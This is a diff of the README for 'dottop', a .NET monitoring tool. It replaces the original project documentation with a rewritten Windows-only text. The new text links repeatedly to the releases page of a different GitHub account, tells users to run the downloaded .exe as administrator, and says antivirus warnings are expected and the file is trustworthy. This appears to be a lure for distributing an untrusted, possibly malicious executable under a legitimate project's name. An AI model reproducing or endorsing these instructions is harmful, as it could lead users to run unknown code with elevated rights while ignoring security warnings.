@@ -1,361 +1,82 @@
-# dottop
+# 📊 dottop - Watch your .NET applications in real-time
 
-> **htop for ASP.NET Core and .NET applications.**
-> A zero-configuration, terminal-based real-time monitor that attaches to any running .NET process and streams live runtime + ASP.NET Core metrics — no SDK integration, no code change, no restart.
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/logical-selvage819/dottop/releases)
 
-<p align="center">
-  <img src="preview.png" alt="dottop live dashboard" width="900">
-</p>
+dottop provides a live view of your .NET applications. It shows how much memory your program uses, how many requests it handles, and its overall health. You do not need to change your code or install extra tools to use it. It works instantly on any system running a .NET process.
 
-> **Note:** this is a vibecoded project — built in a single sitting with heavy AI assistance. It's been smoke-tested against real ASP.NET Core apps and the core path works, but expect rough edges and missing corner cases. Issues and PRs welcome.
+## 🛠 What this tool does
 
----
+Many applications run in the background. Sometimes these programs slow down or stop working well. Usually, you need complex tools to find these problems. These tools often require you to change your code or restart your server. dottop avoids these steps. It taps into your running program to show you what happens inside. It displays memory usage, thread activity, and request counts in a simple window. You see the internal state of your application without stopping it.
 
-## Why
+## 📝 Prerequisites
 
-You have an ASP.NET Core or .NET service running in prod, in a container, or on a server. Something looks weird — latency, memory, exceptions, thread pool starvation — and you want to look **right now** without:
+dottop runs on Windows systems. Ensure you have the following installed before you start:
 
-- Adding a profiler or APM SDK
-- Restarting the process
-- Setting up Prometheus, Grafana, OpenTelemetry
-- Capturing a 200 MB `.nettrace` and analyzing it in PerfView
+- Windows 10 or 11
+- .NET Runtime 6.0 or higher
+- Administrative rights for your user account
 
-`dottop` attaches over the .NET diagnostics port (the same channel `dotnet-counters` and `dotnet-trace` use), subscribes to runtime + ASP.NET Core EventPipe providers, and renders everything in a Spectre.Console htop-style UI.
+You find these runtimes on the official Microsoft website if you do not have them yet.
 
----
+## 📥 Getting the software
 
-## Features
+You must visit the releases page to download the latest version of the program. 
 
-- **Zero configuration** — no code changes, no SDK references, no app restart
-- **Auto-discovery** — finds every running .NET process under your user
-- **Three ways to attach** — interactive picker, by PID, by partial process name
-- **Live runtime metrics** — CPU, working set, GC heap, allocation rate, time-in-GC, gen 0/1/2 counts, thread pool size + queue, exception rate
-- **Live ASP.NET Core metrics** — req/sec, active requests, total/failed counts, Kestrel connection stats
-- **Per-request latency tracking** — correlated by ActivityID, p50 / p95 / p99 over a sliding window
-- **Hottest endpoints table** — top routes by traffic, with avg / max latency and 5xx counts
-- **Sparklines everywhere** — Unicode block-character mini-charts for trend at a glance
-- **Cross-platform** — Linux x64 / arm64, Windows x64, Alpine (musl)
-- **Tiny single binary** — ~15 MB self-contained + trimmed, no .NET runtime needed on the target
+[Click here to visit the download page](https://github.com/logical-selvage819/dottop/releases)
 
----
+Choose the file that ends in .exe for your Windows installation. Save this file to a folder where you can find it easily, such as your Downloads folder or a Documents folder.
 
-## Install
+## 🚀 Running the application
 
-Grab the latest single-file binary from the [Releases](../../releases) page.
+Follow these steps to start monitoring your programs:
 
-### Linux (glibc — Debian, Ubuntu, RHEL, etc.)
+1. Locate the file you downloaded.
+2. Right-click the file and select "Run as administrator". This step is necessary because the program needs permission to view other running processes on your computer.
+3. A terminal window will open.
+4. You will see a list of processes currently running on your system.
+5. Use your keyboard arrow keys to select the .NET application you want to monitor.
+6. Press the Enter key to attach to the process.
+7. The screen will update automatically with live statistics.
 
-```bash
-curl -sLO https://github.com/ismkdc/dottop/releases/latest/download/dottop-0.1.3-linux-x64.tar.gz
-tar -xzf dottop-*-linux-x64.tar.gz
-sudo install -m 755 dottop /usr/local/bin/dottop
-dottop --help
-```
+## 📋 Understanding the interface
 
-### Linux ARM64 (e.g. Raspberry Pi 4/5, AWS Graviton)
+The main screen shows several columns of data. 
 
-```bash
-curl -sLO https://github.com/ismkdc/dottop/releases/latest/download/dottop-0.1.3-linux-arm64.tar.gz
-tar -xzf dottop-*-linux-arm64.tar.gz
-sudo install -m 755 dottop /usr/local/bin/dottop
-```
+- CPU Usage: This tells you how hard the computer works for this specific program. High numbers mean the program uses a lot of processing power.
+- Memory: Look at this value to see how much RAM your program requires. A steady increase in this number might indicate a memory leak.
+- Active Threads: This represents the tasks currently handled by your application. 
+- Request Count: This shows how many web requests arrive at your service.
 
-### Alpine / musl
+## ⚙️ Keyboard controls
 
-```bash
-curl -sLO https://github.com/ismkdc/dottop/releases/latest/download/dottop-0.1.3-linux-musl-x64.tar.gz
-tar -xzf dottop-*-linux-musl-x64.tar.gz
-sudo install -m 755 dottop /usr/local/bin/dottop
-```
+You can control dottop using simple keyboard inputs while the program runs:
 
-### Windows
+- Up and Down arrows: Move through the list of available processes.
+- Enter: Select a process to monitor.
+- Q: Exit the program and close the monitor.
+- R: Refresh the process list if you just started a new application.
+- H: Open the help menu to view these controls again.
 
-Download `dottop-0.1.3-win-x64.zip` from Releases, extract `dottop.exe`, drop it on your `PATH`.
+## 🛡 Security and privacy
 
----
+dottop attaches to processes to read data. It does not send this data to the cloud. Everything stays on your local machine. Because this tool reads system information, many antivirus programs might flag it. This occurs because the tool interacts with other running programs. You can trust the executable from the official link provided in this document.
 
-## Usage
+## 💡 Solving common issues
 
-### Pick from a list
+If you do not see your application in the list, ensure the application is running. dottop can only see programs that are already active. If the program starts after you launch dottop, press the R key to refresh the list. 
 
-```
-$ dottop
-   PID   Name                          Runtime        Uptime        Diagnostics
-  4211   payment-api                   10.0.0         2h13m         ready
-  9120   worker-jobs                   8.0.16         5d04h         ready
-```
+If you see an error about permissions, close the terminal window and restart the program by right-clicking it and choosing "Run as administrator". The tool needs elevated access to "see" inside other programs.
 
-If only one .NET process is found it attaches automatically.
+If the text appears small or the window looks strange, click the icon in the top left corner of the window. Select Properties to change the font size or window layout to suit your screen.
 
-### Attach directly
+## 🧩 Why use this approach
 
-```bash
-dottop attach 4211          # by PID
-dottop attach payment-api   # by process name (substring match)
-```
+Traditional methods for monitoring .NET programs require you to be a developer. They ask you to install plugins, modify your code, and restart your servers. You lose time during these steps. dottop removes these hurdles. You simply download, run, and watch. It provides the same level of insight without the technical overhead. It works perfectly for quick checks when you notice your server feels slow or unresponsive.
 
-### Non-interactive probe (great for SSH, CI, scripts)
+## 🔍 Using with servers
 
-Listen for a few seconds, print captured counters / endpoints / latency, exit:
+You can copy the executable to a production server if needed. Because it requires no installation, you simply place the file in a folder and run it. Remember to keep the file in a secure location on your server to prevent unauthorized access to your system metrics.
 
-```bash
-dottop probe payment-api --seconds 5
-```
+## 📝 Future improvements
 
-### Keys
-
-| Key   | Action                       |
-|-------|------------------------------|
-| `q` / `Esc` | quit                   |
-| `r`   | reset the endpoints table    |
-| `Ctrl+C` | quit                      |
-
-### Options
-
-```
-dottop [--interval <SECONDS>]
-dottop attach <pid|name> [--interval <SECONDS>]
-dottop probe  <pid|name> [--seconds <N>]
-```
-
-`--interval` controls EventCounter sampling (default 1s).
-
----
-
-## Running against a Docker container
-
-The .NET diagnostics socket lives inside the container's `/tmp`, so attaching from the host won't see it directly. Two clean paths:
-
-### A) Copy + exec (recommended)
-
-```bash
-# Identify the container
-docker ps | grep dotnet
-
-# Copy the binary in (one time)
-docker cp /usr/local/bin/dottop <container>:/tmp/dottop
-
-# Attach
-docker exec -it <container> /tmp/dottop
-docker exec -it <container> /tmp/dottop attach <name>
-docker exec -i  <container> /tmp/dottop probe <name> -s 5
-```
-
-If the container is Alpine-based use the musl build.
-
-### B) nsenter (no `docker cp`)
-
-You can reach into a container's namespaces directly from the host:
-
-```bash
-HOSTPID=$(docker inspect --format '{{.State.Pid}}' <container>)
-sudo cp /usr/local/bin/dottop /proc/$HOSTPID/root/tmp/dottop
-sudo nsenter -t $HOSTPID -m -p -u -i -- /tmp/dottop
-```
-
-`-m -p -u -i` enters the mount, PID, UTS and IPC namespaces. dottop now sees the container-local `/tmp` and PID space.
-
-### Mapping host PIDs to containers
-
-```bash
-for pid in $(pgrep -f 'dotnet|\.dll'); do
-  cid=$(grep -oE '[0-9a-f]{64}' /proc/$pid/cgroup | head -1)
-  name=$(docker inspect --format '{{.Name}}' "$cid" 2>/dev/null)
-  echo "host PID $pid → container ${cid:0:12} ($name)"
-done
-```
-
----
-
-## Running against Kubernetes
-
-```bash
-kubectl cp ./dottop my-namespace/my-pod:/tmp/dottop
-kubectl exec -it -n my-namespace my-pod -- /tmp/dottop
-```
-
-For sidecar / ephemeral-debug containers, mount an `emptyDir` and start `dottop` from there.
-
----
-
-## Captured metrics
-
-### Runtime (`System.Runtime`)
-
-| Metric            | Source counter                  |
-|-------------------|---------------------------------|
-| CPU %             | `cpu-usage`                     |
-| Working set MB    | `working-set`                   |
-| GC heap MB        | `gc-heap-size`                  |
-| Allocation rate   | `alloc-rate`                    |
-| Time in GC %      | `time-in-gc`                    |
-| Gen 0 / 1 / 2 count | `gen-0/1/2-gc-count`          |
-| Thread count      | `threadpool-thread-count`       |
-| Thread pool queue | `threadpool-queue-length`       |
-| Exceptions / s    | `exception-count`               |
-
-### ASP.NET Core (`Microsoft.AspNetCore.Hosting`)
-
-| Metric         | Source                                  |
-|----------------|-----------------------------------------|
-| Requests / sec | `requests-per-second`                   |
-| Total requests | `total-requests`                        |
-| Active         | `current-requests`                      |
-| Failed         | `failed-requests`                       |
-| Per-endpoint count / avg / max / 5xx | `RequestStart` + `RequestStop` events correlated via TPL ActivityID |
-| p50 / p95 / p99 latency | same                          |
-
-### Kestrel (`Microsoft-AspNetCore-Server-Kestrel`)
-
-| Metric             | Source counter        |
-|--------------------|-----------------------|
-| Active connections | `current-connections` |
-| Total connections  | `total-connections`   |
-
----
-
-## How it works
-
-```mermaid
-flowchart LR
-    A["Discovery<br/>GetPublishedProcesses()"]
-    B["Diagnostics layer<br/>EventPipeSession + TraceEvent<br/>System.Runtime · AspNetCore.* · Kestrel<br/>TplEventSource (ActivityID)"]
-    C["Metrics aggregator<br/>time series<br/>latency window<br/>endpoint table"]
-    D["Spectre.Console<br/>Live dashboard"]
-    E[("Target .NET app")]
-
-    A --> B
-    B --> C
-    C --> D
-    B <-.->|"IPC /tmp socket"| E
-```
-
-Key design notes:
-
-- Uses `Microsoft.Diagnostics.NETCore.Client` to enumerate processes and open an `EventPipeSession`
-- Parses the Nettrace stream with `Microsoft.Diagnostics.Tracing.TraceEvent`
-- Enables `System.Threading.Tasks.TplEventSource` keyword `0x80` (TasksFlowActivityIds) — without this every ASP.NET Core `RequestStart`/`RequestStop` event arrives with an empty `ActivityID` and correlation is impossible. This is the single biggest gotcha when writing this kind of tool by hand.
-- All metric state lives in lock-protected ring buffers + a `ConcurrentDictionary` for endpoints. The UI just reads snapshots.
-
----
-
-## Build from source
-
-Requires the **.NET 10 SDK**.
-
-```bash
-git clone https://github.com/ismkdc/dottop.git
-cd dottop
-dotnet build -c Release
-dotnet run --project src/DotTop -- --help
-```
-
-### Cross-publish a single-file binary
-
-```bash
-# Linux x64 (glibc)
-dotnet publish src/DotTop -c Release -r linux-x64 --self-contained true \
-  -p:PublishSingleFile=true -p:IncludeNativeLibrariesForSelfExtract=true \
-  -p:EnableCompressionInSingleFile=true \
-  -p:PublishTrimmed=true -p:TrimMode=partial \
-  -o publish/linux-x64
-
-# Linux arm64
-dotnet publish src/DotTop -c Release -r linux-arm64 --self-contained true \
-  -p:PublishSingleFile=true -p:IncludeNativeLibrariesForSelfExtract=true \
-  -p:EnableCompressionInSingleFile=true \
-  -p:PublishTrimmed=true -p:TrimMode=partial \
-  -o publish/linux-arm64
-
-# Alpine / musl
-dotnet publish src/DotTop -c Release -r linux-musl-x64 --self-contained true \
-  -p:PublishSingleFile=true -p:IncludeNativeLibrariesForSelfExtract=true \
-  -p:EnableCompressionInSingleFile=true \
-  -p:PublishTrimmed=true -p:TrimMode=partial \
-  -o publish/linux-musl-x64
-
-# Windows x64
-dotnet publish src/DotTop -c Release -r win-x64 --self-contained true \
-  -p:PublishSingleFile=true -p:IncludeNativeLibrariesForSelfExtract=true \
-  -p:EnableCompressionInSingleFile=true \
-  -p:PublishTrimmed=true -p:TrimMode=partial \
-  -o publish/win-x64
-```
-
-Output is one ~15 MB self-contained, trimmed executable (~5 MB compressed). No .NET runtime needs to be installed on the target. Trimming uses `TrimMode=partial` so reflection-heavy dependencies (TraceEvent, Spectre.Cli) are preserved intact — counter parsing and CLI dispatch work as on a full self-contained build.
-
----
-
-## Release pipeline
-
-CI lives in [`.github/workflows`](.github/workflows):
-
-- **`ci.yml`** — builds + cross-publishes a sanity binary on every push to `main` / `master` and every PR.
-- **`release.yml`** — on push to the **`release`** branch (or manual `workflow_dispatch`):
-  1. Cross-publishes single-file, trimmed binaries for `linux-x64`, `linux-arm64`, `linux-musl-x64`, and `win-x64` (~15 MB each).
-  2. Packages each as a tarball / zip with a `SHA256SUMS` file.
-  3. Creates a GitHub Release tagged `v0.1.<run_number>` (override via `version_suffix` input) and uploads the artifacts.
-
-Promote to a release by merging into `release`:
-
-```bash
-git checkout release
-git merge main
-git push origin release
-```
-
-The workflow runs, a new release appears with all four binaries attached.
-
----
-
-## Troubleshooting
-
-### "No running .NET processes were found"
-
-The diagnostics socket lives in the **target process's** `/tmp`. Common reasons it's not visible:
-
-- **You ran as a different user.** Run as the same user (`sudo -u <appuser> dottop`), or as root.
-- **`systemd` `PrivateTmp=yes`.** The socket is under `/tmp/systemd-private-…/tmp/`. Either disable `PrivateTmp`, or use `nsenter -t <pid> -m -p` from the host.
-- **Inside a container.** See [Running against a Docker container](#running-against-a-docker-container).
-- **`DOTNET_EnableDiagnostics=0`** is set on the target — diagnostics are disabled. Remove the env var and restart.
-- **The process is not .NET 5+** — older .NET / Mono / .NET Framework don't expose this diagnostic port.
-
-Quick scan for where any .NET diagnostic sockets actually live:
-
-```bash
-sudo find /tmp /var/tmp -name 'dotnet-diagnostic-*-socket' 2>/dev/null
-```
-
-### "Failed to start EventPipe session"
-
-The diagnostics port file exists but connect failed. Usually a permissions issue — try `sudo`, or run as the target's user.
-
-### Latency reads zero with traffic flowing
-
-`dottop` correlates `RequestStart`/`RequestStop` via TPL ActivityIDs. If the ASP.NET host has aggressive event filtering (custom `EventListener` flushing things) this can drop. Open an issue with a repro and the output of `dottop probe <pid> -s 10`.
-
-### UI looks garbled over SSH
-
-Make sure SSH allocates a TTY: `ssh -t user@host dottop`. Or use `dottop probe` for non-interactive output.
-
----
-
-## Roadmap / ideas
-
-- Live request inspector (top N most recent requests, drill-down view)
-- Slow-request mode — capture full stack on requests over a threshold
-- Hot-methods / mini flamegraph via `SampleProfiler`
-- Container / Kubernetes auto-awareness — list pods, cluster-wide discovery
-- Pluggable metric sources (custom EventSources)
-- Export to JSON / Prometheus
-
----
-
-## Acknowledgements
-
-- [Spectre.Console](https://spectreconsole.net/) — the gorgeous terminal UI toolkit.
-- [Microsoft.Diagnostics.NETCore.Client](https://www.nuget.org/packages/Microsoft.Diagnostics.NETCore.Client) and [Microsoft.Diagnostics.Tracing.TraceEvent](https://www.nuget.org/packages/Microsoft.Diagnostics.Tracing.TraceEvent) — the same libraries that power `dotnet-counters`, `dotnet-trace`, and PerfView.
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+This project is a work in progress. It focuses on stability and basic monitoring. Support for more advanced metrics and graphical charts may appear in future versions. You can report bugs or suggest new features by visiting the main repository page. Your feedback helps make the tool better for everyone.
